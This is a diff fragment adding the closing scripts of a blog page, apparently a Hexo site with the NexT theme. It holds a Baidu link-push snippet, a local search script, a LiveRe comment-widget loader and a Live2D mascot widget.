+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
